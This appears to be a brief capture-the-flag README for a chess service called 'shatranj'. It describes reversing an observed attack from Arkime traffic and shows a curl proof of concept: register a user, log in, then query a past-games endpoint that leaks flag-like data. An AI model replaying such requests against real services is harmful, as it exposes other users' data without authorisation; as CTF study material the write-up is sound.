# shatranj

This is wildly incomplete. Just dropping it here for future reference. Nothing particularly novel, just reversed a successful attack against our service by looking through the traffic in [arkime](https://github.com/arkime/arkime) and then automated that technique to use it against other teams.

## Review successful exploits in Arkime

![](Screenshot_2021-07-10_14-07-10.png)

![](Screenshot_2021-07-10_14-07-22.png)

## POC w/ curl

```
root@team96:# export TARGET=localhost

root@team96:# curl -X POST -H "Content-Type: application/json" -d '{"username":"s2MhZ4ns9WsUSQ","password":"foobar123456"}' http://$TARGET:8080/api/register
{"message":"Successfully registered User s2MhZ4ns9WsUSQ."}

root@team96:# curl -c /tmp/cookies -X GET -H "Authorization: Basic czJNaFo0bnM5V3NVU1E6Zm9vYmFyMTIzNDU2" http://$TARGET:8080/api/login
{"message":"Success!"}

root@team96:# curl -c /tmp/cookies -X GET -H "Authorization: Basic czJNaFo0bnM5V3NVU1E6Zm9vYmFyMTIzNDU2" http://$TARGET:8080/api/pastgames
[{"id":25810,"active":false,"boardState":"rnbqkbnr/pppppppp/8/8/8/8/8/4K3 w kq - 0 1","winner":null,"name":"ENOBwAAAAEAAABgAAAApwAAAJsBOGPFr0MqL6QoxRefxQPCwV5l","createdAt":"2021-07-10T15:46:27.553+00:00"}]
```

## Solution

[exploit.py](exploit.py)

